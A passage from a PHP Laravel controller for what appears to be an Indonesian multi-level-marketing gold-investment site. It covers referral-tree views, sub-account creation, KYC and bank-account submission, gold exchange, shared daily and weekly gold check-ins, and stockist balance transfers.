        $user->survey_earning += $reward;
        $user->save();

        $transaction = new Transaction();
        $transaction->user_id = $user->id;
        $transaction->amount = getAmount($reward);
        $transaction->post_balance = getAmount($user->balance);
        $transaction->trx_type = '+';
        $transaction->details = 'For Completing ' . $survey->name;
        $transaction->trx =  getTrx();
        $transaction->save();

        notify($user, 'SURVEY_COMPLETED', [
            'survey_name' => $survey->name,
            'amount' => getAmount($reward),
            'currency' => $general->cur_text,
            'post_balance' => getAmount($user->balance)
        ]);

        $notify[] = ['success', 'You have done this survey successfully'];
        return redirect()->route('user.home')->withNotify($notify);
    }
    

    public function user_boom(){
       
        // dd($request->get('username'));
       
        $tree = showTreePage(Auth::id());
        $page_title = 'Manage User';
        $ref = user::where('id', auth::user()->id)
        ->select('users.*',db::raw("SUBSTRING(email, 1, LOCATE('@', email) - 1) AS usr"),db::raw("SUBSTRING(email, LOCATE('@', email) + 1) AS domain"),'users.username as usrn')
        ->first();

        $get_bv = user::where('users.id',Auth::user()->id)
        ->select('users.bro_qty as bv')
        ->first();
        // dd($get_bv->bv);
        $dd = array();
        // $dd2 = array();
        // $dd3 = array();
        // $dd4 = array();
        // $dd5 = array();
        $level = user::where('pos_id',Auth::user()->id)->select('id')->get();
       
        if($level){
            foreach ($level as $key => $value) {
                $dd[] = $value->id;
            }
        }
        
        // foreach ($level as $get_bv->bv => $value) {
            for ($i=0; $i < $get_bv->bv; $i++) {
                # code...
                $level[$i] = user::whereIn('pos_id',$dd)->select('id')->get();
                if($level[$i]){
                    foreach ($level[$i] as $key => $value) {
                        $dd[] = $value->id;
                    }
                }
            }
            # code...
        // }
        // foreach ($level3 as $key => $value) {
        //     $level4 = user::whereIn('ref_id',$dd)->select('id')->get();
        //     if($level4){
        //         foreach ($level4 as $key => $value) {
        //             $dd[] = $value->id;
        //         }
        //     }
        //     # code...
        // }
        // dd($dd);
        // $level4 = user::whereIn('ref_id',$dd2)->select('id')->get();
        // if($level4){
        //     foreach ($level4 as $key => $value) {
        //         $dd3[] = $value->id;
        //     }
        // }
        // $level5 = user::whereIn('ref_id',$dd3)->select('id')->get();
        // if($level5){
        //     foreach ($level5 as $key => $value) {
        //         $dd4[] = $value->id;
        //     }
        // }
        // $level6 = user::whereIn('ref_id',$dd4)->select('id')->get();
        // if($level6){
        //     foreach ($level6 as $key => $value) {
        //         $dd5[] = $value->id;
        //     }
        // }
        $ref_user = user::whereIn('users.pos_id', $dd)
        ->orwhere('users.id', auth::user()->id)//leader
        ->orwhere('users.ref_id', auth::user()->id)//level1
        ->orwhere('users.pos_id', auth::user()->id)//level1
        ->orderby('users.pos_id',"DESC")
        ->select('users.*',db::raw("if(users.id=".auth::user()->id.",'Leader',concat('Level ',users.pos_id-1)) as pos"),'us.no_bro as usa')
        ->leftjoin('users as us','us.id','=','users.pos_id')
        ->get();

        $reg = array();
        $Count = 0;
        $reg_user = user::select('*')->where('email', 'like', $ref->usr.'+' .'%')->get();
        if ($reg_user) {
            # code...
            foreach ($reg_user as $key => $value) {
                $reg[] = $value->email;
                // $Count++;
                // if ($Count == 8){
                //     break; //stop foreach loop after 8th loop
                // }
            }
        }
        // dd($reg);
        // $d = json_decode(json_encode($dd), true);
        addToLog('Open Manage User');
        return view('templates.basic.user.user_boom',compact('page_title','ref','ref_user','reg','get_bv','tree'));
        // $user = User::find(Auth::user()->id);

        // dd($level3);
        // if($level2){
        //     dd('ok');
        // }else{
        //     dd('sip');
        // }
    }

    public function cek_tree($id){
        $tree = showTreePage($id);
        $response ="<div class='row text-center justify-content-center llll'>
        <!-- <div class='col'> -->
        <div class='w-1'>
            ".showSingleUserinTree($tree['a'])."
        </div>
    </div>
    <div class='row text-center justify-content-center llll'>
        <!-- <div class='col'> -->
        <div class='w-2'>
            ".showSingleUserinTree($tree['b'])."
        </div>
        <!-- <div class='col'> -->
        <div class='w-2 '>
            ".showSingleUserinTree($tree['c'])."
        </div>
    </div>
    <div class='row text-center justify-content-center llll'>
        <!-- <div class='col'> -->
        <div class='w-4 '>
            ".showSingleUserinTree($tree['d'])."
        </div>
        <!-- <div class='col'> -->
        <div class='w-4 '>
            ".showSingleUserinTree($tree['e'])."
        </div>
        <!-- <div class='col'> -->
        <div class='w-4 '>
            ".showSingleUserinTree($tree['f'])."
        </div>
        <!-- <div class='col'> -->
        <div class='w-4 '>
            ".showSingleUserinTree($tree['g'])."
        </div>
        <!-- <div class='col'> -->

    </div>";
        // dd($tree['a']['username']);
        // echo json_encode(["response" => $response]);
        echo $response;
    }

    public function cek_pos($id){
        $user = User::where('id',$id)->first();
        $tree = showTreePage($id);
        $cek_awal = User::where('pos_id',$user->id)->first();
        $cek_awal_kiri = User::where('pos_id',$user->id)->where('position',1)->first();
        $cek_awal_kanan = User::where('pos_id',$user->id)->where('position',2)->first();

        $response_tree ="
        <h4 class='row text-center justify-content-center'>Preview tree of ".$user->username." </h4>
        <div class='row text-center justify-content-center llll'>
        <!-- <div class='col'> -->
        <div class='w-1'>
            ".showSingleUserinTree($tree['a'],$id)."
        </div>
        </div>
        <div class='row text-center justify-content-center llll'>
            <!-- <div class='col'> -->
            <div class='w-2 pleft'>
                ".showSingleUserinTree($tree['b'],$id)."
            </div>
            <!-- <div class='col'> -->
            <div class='w-2 pright'>
                ".showSingleUserinTree($tree['c'],$id)."
            </div>
        </div>
        <div class='row text-center justify-content-center'>
            <!-- <div class='col'> -->
            <div class='w-4 '>
                ".showSingleUserNoLine($tree['d'],$id)."
            </div>
            <!-- <div class='col'> -->
            <div class='w-4 '>
                ".showSingleUserNoLine($tree['e'],$id)."
            </div>
            <!-- <div class='col'> -->
            <div class='w-4 '>
                ".showSingleUserNoLine($tree['f'],$id)."
            </div>
            <!-- <div class='col'> -->
            <div class='w-4 '>
                ".showSingleUserNoLine($tree['g'],$id)."
            </div>
            <!-- <div class='col'> -->

        </div>";
        return response()->json(['sts'=>200,'tree'=>$response_tree]);
        // <div class='row text-center justify-content-center llll'>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['h'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['i'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['j'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['k'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['l'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['m'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['n'],$id)."
        //     </div>
        //     <!-- <div class='col'> -->
        //     <div class='w-8'>
        //         ".showSingleUserinTree2Update($tree['o'],$id)."
        //     </div>


        // </div>

        // if ($cek_awal) {
        //     # code...
        //     if ($cek_awal_kiri) {
        //         if ($cek_awal_kanan) {
        //             echo json_encode(["response" => '3','tree'=>$response_tree]);
        //             # code...
        //         }else{
        //             echo json_encode(["response" => '2','tree'=>$response_tree]);

        //         }
        //     }else{
        //         if ($cek_awal_kanan) {
        //             # code...
        //             echo json_encode(["response" => '1','tree'=>$response_tree]);
        //         }else{
        //             echo json_encode(["response" => '0','tree'=>$response_tree]);
        //         }
        //     }
        // }else{
        //     echo json_encode(["response" => '0','tree'=>$response_tree]);
        // }
        // $get_kanan = getPosition($user->id, 2);
        // $get_kiri = getPosition($user->id, 1);
        // if ($user->pos_id = $get_kanan['pos_id']) {
        //     # code...
        //     echo json_encode(["response" => '2']);
        // }elseif($user->pos_id = $get_kiri['pos_id']){
        //     echo json_encode(["response" => '1']);
        // }
        // elseif($user->pos_id = $get_kiri['pos_id'] && $user->pos_id = $get_kanan['pos_id']){
        //     echo json_encode(["response" => '3']);
        // }
        // else{
        //     echo json_encode(["response" => '0']);
        // }
        // $cek_bawah_kanan = User::where('ref_id',$cek_awal->ref_id)->where('pos_id',$cek_awal->pos_id+1)->where('position',2)->first();
        // $cek_bawah_kiri = User::where('ref_id',$cek_awal->ref_id)->where('pos_id',$cek_awal->pos_id+1)->where('position',1)->first();

        // $cek_bawah = User::where('pos_id',$user->pos_id+1)->where('position',2)
        // ->orwhere('pos_id',$user->pos_id+1)->where('position',1)
        // // ->orwhere('ref_id',$id)
        // ->get();

        // $cek_ref_bawah_kanan = user::where('ref_id',$id)->where('position',2)->first();
        // $cek_ref_bawah_kiri = user::where('ref_id',$id)->where('position',1)->first();
        // $cek_ref_bawah_kanan = User::where('ref_id',$id)->where('pos_id',$user->pos_id+1)->where('position',2)->first();
        // dd($cek_ref_bawah_kanan);
        // if($cek_awal){
        //     $cek_bawah_kiri = User::where('pos_id',$user->pos_id+1)->where('position',1)->first();
        //     if ($cek_bawah_kiri) {
        //         $cek_bawah_kanan = User::where('pos_id',$user->pos_id+1)->where('position',2)->first();
        //         if ($cek_bawah_kanan) {

        //             // dd('Penuh');
        //             echo json_encode(["response" => '3']);
        //         }else{
        //             $cek_ref_bawah_kanan = user::where('ref_id',$id)->where('position',2)->first();
        //             if ($cek_ref_bawah_kanan) {
        //                 # code...
        //                 echo json_encode(["response" => '3']);
        //             }else{
        //                 echo json_encode(["response" => '2']);
        //             }
        //             // dd('Kanan Kosong');
        //         }
        //     }else{
        //         // dd('Kiri Kosong');
        //         $cek_bawah_kanan = User::where('pos_id',$user->pos_id+1)->where('position',2)->first();
        //         if ($cek_bawah_kanan) {
        //             // dd('Penuh');
        //             // $cek_ref_bawah_kiri = user::where('ref_id',$id)->where('position',1)->first();
        //             echo json_encode(["response" => '1']);
        //         }else{
        //             // dd('Kanan Kosong');
        //             $cek_ref_bawah_kiri = user::where('ref_id',$id)->where('position',1)->first();
        //             if ($cek_ref_bawah_kiri) {
        //                 # code...
        //                 echo json_encode(["response" => '3']);
        //             }else{
        //                 echo json_encode(["response" => '1']);
        //             }
        //             // echo json_encode(["response" => '2']);
        //         }
        //     }
        // }else{
        //     // dd('Kosong');
        //     $cek_ref_bawah_kiri = user::where('ref_id',$id)->where('position',1)->first();
        //     if ($cek_ref_bawah_kiri) {
        //         $cek_ref_bawah_kanan = user::where('ref_id',$id)->where('position',2)->first();
        //         if ($cek_ref_bawah_kanan) {
        //             # code...
        //             echo json_encode(["response" => '3']);
        //         }else{
        //             echo json_encode(["response" => '2']);
        //         }

        //         # code...
        //     }else{
        //         $cek_ref_bawah_kanan = user::where('ref_id',$id)->where('position',2)->first();
        //         if ($cek_ref_bawah_kanan) {
        //             # code...
        //             echo json_encode(["response" => '1']);
        //         }else{
        //             echo json_encode(["response" => '0']);
        //         }
        //     }
        // }
        // dd($cek_ref_bawah_kanan);
        // dd($d);
    }

    public function user(Request $request){
        // dd($request->all());
        // dd($request->ref_username1);
        $gnl = GeneralSetting::first();

        $userCheck = User::where('id', $request->ref_username)->first();
        $pos = User::where('no_bro',$request->upMp)->first();
        if(auth()->user()->id == $pos->id){
            $ref_pos = $request->pos;
        }else{
            $ref_pos = $pos->position;
        }
        $us = user::where('id',Auth::user()->id)->first();
        //User Create
        $user = new User();
        $user->no_bro       = generateUniqueNoBro();
        $user->ref_id       = Auth::user()->id;
        $user->plan_id      = 1;
        $user->pos_id       = $pos->id;
        $user->position     = $request->pos;
        $user->position_by_ref = $ref_pos;
        $user->firstname    = isset($us->firstname) ? $us->firstname : null;
        $user->lastname     = isset($us->lastname) ? $us->lastname.' '.$request->count : null;
        $user->email        = strtolower(trim($request->email));
        $user->password     = $us->password;
        $user->username     = trim($request->username);
        // $user->ref_id       = $userCheck->id;
        $user->mobile       = $us->mobile;
        $user->address      = $us->address;
        $user->lat          = $us->lat;
        $user->lng          = $us->lng;
        $user->status = 1;
        $user->is_kyc = 2;
        $user->ev = 1;
        $user->sv = 1;
        $user->ts = 0;
        $user->tv = 1;
        $user->new_ps = 1;
        $user->save();

        $user_extras = new UserExtra();
        $user_extras->user_id = $user->id;
        $user_extras->save();
        updatePaidCount2($user->id);
        $details = $user->username . ' Placed Successfully';

        referralCommission2($user->id, $details);

        $userrek = rekening::where('user_id',auth()->user()->id)->first();
        $rek = new rekening();
        $rek->user_id       = $user->id;
        $rek->nama_bank     = $userrek->nama_bank;
        $rek->nama_akun     = $userrek->nama_akun;
        $rek->no_rek        = $userrek->no_rek;
        $rek->kota_cabang   = $userrek->kota_cabang;
        $rek->save();
        // updateFreeCount($user->id);
        // dd($user);
        addToLog('Placed '.$user->username .' From Manage User');

        $notify[] = ['success', 'Account '.$user->username.' successfully registered.'];
        return redirect()->back()->withNotify($notify);
    }

    public function verification(){
        $data['page_title'] = 'Data Verifications';
        $data['bank'] = bank::all();
        $data['bank_user'] = rekening::where('user_id',Auth::user()->id)->first();
        $data['user'] = Auth::user();
        $data['provinsi'] = \Indonesia::allProvinces();
        addToLog('Data Verifications');
        return view('templates.basic.user.kyc',$data);
    }

    public function submitVerification(Request $request)
    {
        $request->validate([
            'firstname' => 'required|string|max:50',
            'lastname' => 'required|string|max:50',
            'address' => "nullable|max:80",
            'state' => 'nullable|max:80',
            'zip' => 'nullable|max:40',
            'city' => 'nullable|max:50',
            'image' => 'mimes:png,jpg,jpeg',
            'bank_name' => 'required',
            'acc_name' => 'required',
            'acc_number' => 'required'
        ],[
            'firstname.required'=>'First Name Field is required',
            'lastname.required'=>'Last Name Field is required'
        ]);


        $in['firstname'] = $request->firstname;
        $in['lastname'] = $request->lastname;
        $in['nik'] = $request->nik;
        // $in['foto_ktp'] = $request->ktp;
        // $in['foto_selfie'] = $request->selfie;
        $in['is_kyc'] = 1;
        $prov = \Indonesia::findProvince($request->provinsi, $with = null);
        $kota = \Indonesia::findCity($request->kota, $with = null);
        $kec  = \Indonesia::findDistrict($request->kecamatan, $with = null);
        $desa  = \Indonesia::findVillage($request->desa, $with = null);
        $in['firstname'] = $request->firstname;
        $in['lastname'] = $request->lastname;
        if(is_numeric($request->kota)){
            $in['address'] = [
                'address' => $request->alamat,
                'state' => $prov->name,
                'zip' => $request->pos,
                'country' => $request->country,
                'city' => $kota->name,
                'prov'  => $prov->name,
                'prov_code'  => $request->provinsi,
                'kota'  => $kota->name,
                'kec'   => $kec->name,
                'desa'  => $desa->name,
            ];
            $in['lat'] = $desa->meta['lat'];
            $in['lng'] = $desa->meta['long'];
            $in['address_check']    = 1;

        }else{
           $in['address'] = [
                'address' =>$request->alamat,
                'state' => auth()->user()->address->prov,
                'zip' => $request->pos,
                'country' => $request->country,
                'city' => auth()->user()->address->city,
                'prov'  => auth()->user()->address->prov,
                'prov_code'  => auth()->user()->address->prov_code,
                'kota'  => auth()->user()->address->kota,
                'kec'   =>auth()->user()->address->kec,
                'desa'  => auth()->user()->address->desa,
            ];
            $in['lat'] = auth()->user()->lat;
            $in['lng'] = auth()->user()->lng;
        }
        $user = Auth::user();
        
        $rek = new rekening();
        $rek->user_id = $user->id;
        $rek->nama_bank = $request->bank_name;
        $rek->nama_akun = $request->acc_name;
        $rek->no_rek = $request->acc_number;
        $rek->kota_cabang = $request->kota_cabang;
        $rek->save();
        // if ($request->hasFile('image')) {
        //     $image = $request->file('image');
        //     $filename = time() . '_' . $user->username . '.jpg';
        //     $location = 'assets/images/user/profile/' . $filename;
        //     $in['image'] = $filename;

        //     $path = './assets/images/user/profile/';
        //     $link = $path . $user->image;
        //     if (file_exists($link)) {
        //         @unlink($link);
        //     }
        //     $size = imagePath()['profile']['user']['size'];
        //     $image = Image::make($image);
        //     $size = explode('x', strtolower($size));
        //     $image->resize($size[0], $size[1]);
        //     $image->save($location);
        // }
        if ($request->hasFile('ktp')) {
            $image = $request->file('ktp');
            $filename = time() . '_ktp_' . $user->username . '.jpg';
            $location = 'assets/images/user/kyc/' . $filename;
            $in['foto_ktp'] = $filename;

            $path = './assets/images/user/kyc/';
            $link = $path . $user->foto_ktp;
            if (file_exists($link)) {
                @unlink($link);
            }
            // $size = imagePath()['profile']['user']['size'];
            $image = Image::make($image);
            // $size = explode('x', strtolower($size));
            // $image->resize($size[0], $size[1]);
            $image->save($location);
        }
        if ($request->hasFile('selfie')) {
            $image = $request->file('selfie');
            $filename = time() . '_self_' . $user->username . '.jpg';
            $location = 'assets/images/user/kyc/' . $filename;
            $in['foto_selfie'] = $filename;

            $path = './assets/images/user/kyc/';
            $link = $path . $user->foto_selfie;
            if (file_exists($link)) {
                @unlink($link);
            }
            // $size = imagePath()['profile']['user']['size'];
            $image = Image::make($image);
            // $size = explode('x', strtolower($size));
            // $image->resize($size[0], $size[1]);
            $image->save($location);
        }
        $user->fill($in)->save();

        addToLog('Send Data Verification.');

        $notify[] = ['success', 'Data Verification send successfully.'];
        return redirect()->route('user.home')->withNotify($notify);
    }


    public function goldInvest(){
        $page_title = 'Gold Invest';
        $empty_message = 'Gold Invest Not found.';
        $alamat = alamat::where('user_id',Auth::user()->id)->get();
        $gold_bro  = Gold::where('user_id',Auth::user()->id)->where('golds.qty','!=',0)->where('products.is_custom','!=',1)->join('products','products.id','=','golds.prod_id')->select('products.*','golds.id as gid','golds.qty',db::raw('SUM(products.price * golds.qty) as total_rp'),db::raw('sum(products.weight * golds.qty ) as total_wg'))
        ->where('golds.from_bro','=',1)
        ->groupBy('golds.prod_id')
        ->get();

        $golds  = Gold::where('user_id',Auth::user()->id)->where('golds.qty','!=',0)->where('products.is_custom','!=',1)->join('products','products.id','=','golds.prod_id')->select('products.*','golds.id as gid','golds.qty',db::raw('SUM(products.price * golds.qty) as total_rp'),db::raw('sum(products.weight * golds.qty ) as total_wg'))
        ->where('golds.from_bro','=',0)
        ->groupBy('golds.prod_id')
        ->get();
        // ->paginate(getPaginate());
        $Corder = corder::where('corders.user_id',Auth::user()->id)
        ->select('products.*','corders.name as cname','golds.id as gid','golds.qty',db::raw('(products.price * golds.qty) as total_rp'),db::raw('(products.weight * golds.qty ) as total_wg'))
        ->join('products','products.id','=','corders.prod_id')
        ->join('golds','golds.id','=','corders.gold_id')
        ->where('golds.from_bro','=',0)
        ->where('corders.status',1)->get();

        // dd($Corder);
        // dd($Corder->toArray());
        $goldq = $golds->toArray();
        $goldw = $Corder->toArray();
        $gold = new Collection();
        foreach($goldq as $item){
                    $gold->push((object)[
                        "id" => $item['id'],
                        "gid" => $item['gid'],
                        "image" => $item['image'],
                        "name" => $item['name'],
                        "weight" => $item['weight'],
                        "price" => $item['price'],
                        "status" => $item['status'],
                        "created_at" => $item['created_at'],
                        "updated_at" => $item['updated_at'],
                        "is_reseller" => $item['is_reseller'],
                        "stok" => $item['stok'],
                        "is_custom" => $item['is_custom'],
                        "qty" => $item['qty'],
                        "total_rp" => $item['total_rp'],
                        "total_wg" => $item['total_wg'],

                    ]);

                }
        foreach($goldw as $item){
                    $gold->push((object)[
                        "id" => $item['id'],
                        "gid" => $item['gid'],
                        "image" => $item['image'],
                        "name" => $item['cname'],
                        "weight" => $item['weight'],
                        "price" => $item['price'],
                        "status" => $item['status'],
                        "created_at" => $item['created_at'],
                        "updated_at" => $item['updated_at'],
                        "is_reseller" => $item['is_reseller'],
                        "stok" => $item['stok'],
                        "is_custom" => $item['is_custom'],
                        "qty" => $item['qty'],
                        "total_rp" => $item['total_rp'],
                        "total_wg" => $item['total_wg'],

                    ]);

                }

        return view('templates.basic.user.gold',compact('page_title', 'empty_message','gold','alamat','gold_bro'));
    }

    public function goldExchange(Request $request){
        // dd($request->all());
        $gold = Gold::where('golds.user_id',Auth::user()->id)
        ->join('products','products.id','=','golds.prod_id')
        ->where('golds.prod_id',$request->product_id)
        ->select('golds.*','products.price as price','products.weight as weight')
        ->first();
        // dd($request->all());
        // dd((int)$request->totals);
        if ($request->totals < 1 || (int)$request->totals % 5 != 0) {
            # code...
            $notify[] = ['error', 'The total weight must be a multiple of 5, 10, 15,....'];
            return redirect()->back()->withNotify($notify);
        }

        if ($request->qty > $gold->qty) {
            # code...
            $notify[] = ['error', 'The weight you put in is more than the amount of gold you have.'];
            return redirect()->back()->withNotify($notify);
        }else{
            $ex = new goldExchange();
            $ex->ex_id = getTrx();
            $ex->user_id = Auth::user()->id;
            $ex->qty = $request->qty;
            $ex->qty_after = $gold->qty - $request->qty ;
            $ex->prod_id = $request->product_id;
            $ex->wei = $request->qty * $gold->weight;
            $ex->total = $gold->price * $request->qty;
            $ex->charge = 0;
            $ex->after_charge = $ex->total - $ex->charge;
            $ex->status = 1;
            $ex->save();

            // dd($ex->total);

            // $gold->qty -= $request->qty;
            // $gold->save();

            $notify[] = ['success', 'Gold exchange request is successful, please wait for confirmation.'];
            return redirect()->route('user.report.exchangeLog')->withNotify($notify);
        }
    }

    public function edit_rekening(Request $request){
        $this->validate($request, [
            'bank_name' => 'required',
            'acc_name' => 'required',
            'acc_number' => 'required'
        ]);

        $user = Auth::user();

        $rek = rekening::where('user_id',$user->id)->first();
        $rek->update([
            'nama_bank' => $request->bank_name,
            'nama_akun' => $request->acc_name,
            'no_rek' => $request->acc_number,
            'kota_cabang' => $request->kota_cabang,
        ]);
        
        $user->bank_up = 0;
        $user->save();

        addToLog("Edit Bank Account");
        $notify[] = ['success', 'Bank Account Information, Success edited!!'];
        return redirect()->back()->withNotify($notify);

        // dd($request->all());
    }
    public function add_rekening(Request $request){
        $this->validate($request, [
            'bank_name' => 'required',
            'acc_name' => 'required',
            'acc_number' => 'required'
        ]);

        $user = Auth::user();

        $rek = new rekening();
        $rek->user_id = $user->id;
        $rek->nama_bank = $request->bank_name;
        $rek->nama_akun = $request->acc_name;
        $rek->no_rek = $request->acc_number;
        $rek->kota_cabang = $request->kota_cabang;
        $rek->save();

        addToLog('Add Bank Account');
        $notify[] = ['success', 'Bank Account Information, Success added!!'];
        return redirect()->back()->withNotify($notify);

        // dd($request->all());
    }

    public function updateStockiest($id){
        $activeUser = Auth::user()->id;
        if($activeUser == $id){
            return response()->json(['status'=>201,'msg'=>'Failed, Unauthorized!'],201);
        }
        $user = User::find($id);
        $is_stockiest = $user->is_stockiest;
        if($is_stockiest){
            $new = 0;
        }else{
            $new = 1;
        }
        $user->is_stockiest = $new;
        $user->save();
        return response()->json(['status'=>200,'msg'=>'success update'],200);
    }
    
    public function newDailyCheckIn(Request $request){
        $user = Auth::user();
        if(!checkClaimDailyWeekly($user)){
            return Redirect::back()->with('notify',[
                ['warning', 'You already claimed gold or your quota has reached the limit.']
            ]);
        }
        $userBank = rekening::where('user_id',$user->id)->first();
        $checkSame = DB::table('users')
                        ->leftJoin('rekenings', 'users.id', '=', 'rekenings.user_id')
                        ->where(function ($query) use ($userBank) {
                            $query->where('nama_bank', $userBank->nama_bank)
                                ->where('no_rek', $userBank->no_rek)
                                ->orWhere('nama_akun', 'like', '%'.$userBank->nama_akun.'%');
                        })
                        ->groupBy('users.id')
                        ->select('users.id AS users', 'rekenings.*')
                        ->get();
        $no = 0;
        foreach ($checkSame as $key => $value) {
            $user = User::find($value->user_id);
            $no +=  deliverDailyWeekly($user);
        }              
        addToLog('Users Check-In Gold to '.$no.' users');
        return redirect()->back()->with('notify', [
            ['success', 'You Successfully Claimed and '. $no .' Possible Same Bank Account Gold Check-In']
        ]);
    }


    public function dailyCheckInOld(Request $request)
    {
       
        $user = $request->user();

        if (! User::canClaimDailyGold($user->id)) {
            return Redirect::back()->with('notify',[
                ['warning', 'You already claimed your daily gold or your quota has reached the limit.']
            ]);
        }

        
        //send to same bank account;
        try {
            $no = 1;
            $userBank = rekening::where('user_id',$user->id)->first();
            if($userBank){
                // $checkSame = rekening::where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                //                     ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->get();
                $checkSame = User::leftJoin('rekenings','users.id','=','rekenings.user_id')->where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                                    ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->groupBy('users.id')->select('users.id AS users', 'rekenings.*') ->get();
                foreach ($checkSame as $key => $value) {
                    $latest = UserGold::where('user_id',$value->user_id)->orderByDesc('id')->first();
    
                    if($latest){
                        UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => $latest->day + 1,
                            'type'      => 'daily',
                            'golds'     => 0.005
                        ]);
                    }else{
                          UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => 1,
                            'type'      => 'daily',
                            'golds'     => 0.005
                        ]);
                    }
                    $no++;
                }
            }else{
                $latest = UserGold::where('user_id',$user->id)->orderByDesc('id')->first();

                if($latest){
                    UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => $latest->day + 1,
                        'type'      => 'daily',
                        'golds'     => 0.005
                    ]);
                }else{
                        UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => 1,
                        'type'      => 'daily',
                        'golds'     => 0.005
                    ]);
                }
            }
            addToLog('Daily Gold Check-In');
            return redirect()->back()->with('notify', [
                ['success', 'Successfully Claimed You and '. $no .' Same Bank Account, Daily Gold Check-In']
            ]);
        } catch (\Throwable $th) {
            dd($th->getMessage());
        }
    }
     public function weeklyCheckIn(Request $request)
    {
        $user = $request->user();
        $lastWeek = WeeklyGold::orderByDesc('id')->first();

        if (!chekWeeklyClaim($user->id)) {
            return Redirect::back()->with('notify',[
                ['warning', 'You already claimed your weekly gold or your quota has reached the limit.']
            ]);
        }
        
        //send to same bank account;
        try {
            $no = 1;

            $userBank = rekening::where('user_id',$user->id)->first();
            if($userBank){
                // $checkSame = rekening::where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                //                     ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->get();
                $checkSame = User::leftJoin('rekenings','users.id','=','rekenings.user_id')->where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                                    ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->groupBy('users.id')->select('users.id AS users', 'rekenings.*') ->get();
                foreach ($checkSame as $key => $value) {
                    $latest = UserGold::where('user_id',$value->user_id)->where('type','weekly')->orderByDesc('id')->first();
    
                   
                    if(chekWeeklyClaim($value->user_id)){
                        if($latest){
                        UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => $latest->day + 1,
                            'type'      => 'weekly',
                            'golds'     => 0.005,
                            'week'      => $lastWeek->week
                        ]);
                    }else{
                          UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => 1,
                            'type'      => 'weekly',
                            'golds'     => 0.005,
                            'week'      => $lastWeek->week

                        ]);
                    }
                    }
                    $no++;
                }
            }else{
                $latest = UserGold::where('user_id',$user->id)->where('type','weekly')->orderByDesc('id')->first();


                if($latest){
                    UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => $latest->day + 1,
                        'type'      => 'weekly',
                        'golds'     => 0.005
                    ]);
                }else{
                        UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => 1,
                        'type'      => 'weekly',
                        'golds'     => 0.005
                    ]);
                }
            }
            addToLog('Daily Gold Check-In');
            return redirect()->back()->with('notify', [
                ['success', 'Successfully Claimed You and '. $no .' Same Bank Account, Weekly Gold Check-In']
            ]);
        } catch (\Throwable $th) {
            dd($th->getMessage());
        }
    }

    public function cronDailyCheckIn(Request $request)
    {
       
        $user = User::find(115); //masterplan01

        if (! User::canClaimDailyGold($user->id)) {
           return 'You already claimed your daily gold or your quota has reached the limit.';
        }

        
        //send to same bank account;
        try {
                $no = 1;

            $userBank = rekening::where('user_id',$user->id)->first();
            if($userBank){
                // $checkSame = rekening::where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                //                     ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->get();
                $checkSame = User::leftJoin('rekenings','users.id','=','rekenings.user_id')->where(['nama_bank'=>$userBank->nama_bank,'no_rek'=>$userBank->no_rek])
                                    ->orWhere('nama_akun','like','%'.$userBank->nama_akun.'%')->groupBy('users.id')->select('users.id AS users', 'rekenings.*') ->get();
                foreach ($checkSame as $key => $value) {
                    $latest = UserGold::where('user_id',$value->user_id)->orderByDesc('id')->first();
    
                    if($latest){
                        UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => $latest->day + 1,
                            'type'      => 'daily',
                            'golds'     => 0.005
                        ]);
                    }else{
                          UserGold::create([
                            'user_id'   => $value->user_id,
                            'day'       => 1,
                            'type'      => 'daily',
                            'golds'     => 0.005
                        ]);
                    }
                    $no++;
                }
            }else{
                $latest = UserGold::where('user_id',$user->id)->orderByDesc('id')->first();

                if($latest){
                    UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => $latest->day + 1,
                        'type'      => 'daily',
                        'golds'     => 0.005
                    ]);
                }else{
                        UserGold::create([
                        'user_id'   => $user->id,
                        'day'       => 1,
                        'type'      => 'daily',
                        'golds'     => 0.005
                    ]);
                }
            }
            // return redirect()->back()->with('notify', [
            //     ['success', 'Successfully Claimed You and '. $no .' Same Bank Account, Daily Gold Check-In']
            // ]);
            return 'success';
        } catch (\Throwable $th) {
            return 'error';
        }
    }


   
    public function addSubBalance(Request $request, $id)
    {
        $amount = preg_replace("/[^0-9]/", "", $request->amount);
        $amount = (int)$amount;
        $request->validate(['amount' => 'required']);
        
        $user = User::findOrFail($id);
        $userStockiest = Auth::user();
        $amount = getAmount($amount);
        $general = GeneralSetting::first(['cur_text','cur_sym']);
        $trx = getTrx();
        
        if ($request->act) {
            if(($userStockiest->balance - $amount) < 0 ){
                $notify[] = ['error', $userStockiest->username . ' has insufficient balance.'];
                return back()->withNotify($notify);
            }
            $user->balance += $amount;
            $user->save();
            $transaction = new Transaction();
            $transaction->user_id = $user->id;
